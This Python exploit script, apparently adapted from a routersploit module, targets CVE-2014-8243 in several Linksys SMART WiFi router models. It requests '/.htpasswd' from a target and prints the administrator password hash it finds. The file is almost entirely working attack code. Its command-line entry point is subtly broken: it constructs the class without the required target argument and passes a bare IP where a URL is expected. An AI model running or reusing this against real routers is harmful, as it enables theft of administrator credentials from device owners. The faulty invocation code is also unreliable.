target = ""
# rsf exploit module
# description: Exploit implementation for Linksys SMART WiFi Password Disclosure vulnerability. If target is vulnerable administrator's MD5 password is retrieved.

import requests
import re

class Exploit:
    __info__ = {
        "name": "Linksys SMART WiFi Password Disclosure",
        "description": "Exploit implementation for Linksys SMART WiFi Password Disclosure vulnerability. "
                       "If target is vulnerable administrator's MD5 password is retrieved.",
        "authors": (
            "Sijmen Ruwhof",  
            "0BuRner",  
        ),
        "references": (
            "https://www.kb.cert.org/vuls/id/447516",
            "http://sijmen.ruwhof.net/weblog/268-password-hash-disclosure-in-linksys-smart-wifi-routers",
            "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-8243",
        ),
        "devices": (
            "Linksys EA2700 < Ver.1.1.40 (Build 162751)",
            "Linksys EA3500 < Ver.1.1.40 (Build 162464)",
            "Linksys E4200v2 < Ver.2.1.41 (Build 162351)",
            "Linksys EA4500 < Ver.2.1.41 (Build 162351)",
        ),
    }

    def __init__(self, target):
        self.target = target

    def run(self):
        if self.check():
            print("Target seems to be vulnerable")

            response = requests.get(self.target + "/.htpasswd")
            if response.text.find('$') != -1:
                print("Likely Unix crypt hash: $id$salt$hashed")
            else:
                print("Likely base64 encoded .htaccess")

            print("Hash found:", response.text)
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def check(self):
        response = requests.get(self.target + "/.htpasswd")
        if response.status_code == 200:
            res = re.findall(r"^([a-zA-Z0-9]+:\S+)", response.text)
            if res:
                return True
        return False




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
